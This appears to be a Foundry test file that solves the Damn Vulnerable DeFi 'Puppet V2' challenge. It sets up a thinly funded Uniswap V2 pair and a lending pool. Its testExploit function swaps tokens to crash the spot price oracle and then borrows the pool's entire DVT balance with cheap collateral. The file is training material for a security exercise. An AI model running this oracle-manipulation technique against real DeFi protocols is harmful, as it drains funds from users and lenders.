// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WETH9} from "../../../src/Contracts/WETH9.sol";

import {PuppetV2Pool} from "../../../src/Contracts/puppet-v2/PuppetV2Pool.sol";

import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../src/Contracts/puppet-v2/Interfaces.sol";

contract PuppetV2 is Test {
    // Uniswap exchange will start with 100 DVT and 10 WETH in liquidity
    uint256 internal constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
    uint256 internal constant UNISWAP_INITIAL_WETH_RESERVE = 10 ether;

    // attacker will start with 10_000 DVT and 20 ETH
    uint256 internal constant ATTACKER_INITIAL_TOKEN_BALANCE = 10_000e18;
    uint256 internal constant ATTACKER_INITIAL_ETH_BALANCE = 20 ether;

    // pool will start with 1_000_000 DVT
    uint256 internal constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
    uint256 internal constant DEADLINE = 10_000_000;

    IUniswapV2Pair internal uniswapV2Pair;
    IUniswapV2Factory internal uniswapV2Factory;
    IUniswapV2Router02 internal uniswapV2Router;

    DamnValuableToken internal dvt;
    WETH9 internal weth;

    PuppetV2Pool internal puppetV2Pool;
    address payable internal attacker;
    address payable internal deployer;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        attacker = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("attacker")))))
        );
        vm.label(attacker, "Attacker");
        vm.deal(attacker, ATTACKER_INITIAL_ETH_BALANCE);

        deployer = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("deployer")))))
        );
        vm.label(deployer, "deployer");

        // Deploy token to be traded in Uniswap
        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        weth = new WETH9();
        vm.label(address(weth), "WETH");

        // Deploy Uniswap Factory and Router
        uniswapV2Factory = IUniswapV2Factory(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Factory.json",
                abi.encode(address(0))
            )
        );

        uniswapV2Router = IUniswapV2Router02(
            deployCode(
                "./src/build-uniswap/v2/UniswapV2Router02.json",
                abi.encode(address(uniswapV2Factory), address(weth))
            )
        );

        // Create Uniswap pair against WETH and add liquidity
        dvt.approve(address(uniswapV2Router), UNISWAP_INITIAL_TOKEN_RESERVE);
        uniswapV2Router.addLiquidityETH{value: UNISWAP_INITIAL_WETH_RESERVE}(
            address(dvt),
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer, // to
            DEADLINE // deadline
        );

        // Get a reference to the created Uniswap pair
        uniswapV2Pair = IUniswapV2Pair(
            uniswapV2Factory.getPair(address(dvt), address(weth))
        );

        assertGt(uniswapV2Pair.balanceOf(deployer), 0);

        // Deploy the lending pool
        puppetV2Pool = new PuppetV2Pool(
            address(weth),
            address(dvt),
            address(uniswapV2Pair),
            address(uniswapV2Factory)
        );

        // Setup initial token balances of pool and attacker account
        dvt.transfer(attacker, ATTACKER_INITIAL_TOKEN_BALANCE);
        dvt.transfer(address(puppetV2Pool), POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool.
        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(1 ether),
            0.3 ether
        );

        assertEq(
            puppetV2Pool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            ),
            300_000 ether
        );

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/
        //1) Downgrade to 6-septembre-2021 foundry version with:
        //
        //foundryup -C f5ca74b2d0d75c4e2f971da25abc591a8b00183c
        //
        vm.startPrank(attacker);
        // Query how much ether we need to get all PuppetV2Pool DVT balance
        uint256 col = puppetV2Pool.calculateDepositOfWETHRequired(1_000_000e18);
        console.log(
            "Initial collateral required to borrow and drain:",
            col / 1e18,
            " ETH"
        );
        // Its too much, so lets manipulate price.
        console.log("Lets swap our DVT to manipulate price");
        dvt.approve(address(uniswapV2Router), 10_000e18);
        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(uniswapV2Router.WETH());
        uniswapV2Router.swapExactTokensForETH(
            10_000e18,
            0,
            path,
            attacker,
            block.timestamp
        );

        // Query again how much ether we need to get all PuppetV2Pool DVT balance
        col = puppetV2Pool.calculateDepositOfWETHRequired(1_000_000e18);
        console.log(
            "Collateral now required to borrow and drain:",
            col / 1e18,
            " ETH"
        );
        //Now, price it affordable, so let's drain PuppetV2Pool with wrapped ether
        weth.deposit{value: col}();
        weth.approve(address(puppetV2Pool), col);
        puppetV2Pool.borrow(1_000_000e18);
        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        console.log(
            "Attacker's final DVT balance  :",
            dvt.balanceOf(attacker) / 1e18
        );
        console.log(
            "Puppetv2Pool final DVT balance:",
            dvt.balanceOf(address(puppetV2Pool)) / 1e18
        );
        assertEq(dvt.balanceOf(attacker), POOL_INITIAL_TOKEN_BALANCE);
        assertEq(dvt.balanceOf(address(puppetV2Pool)), 0);
    }
}
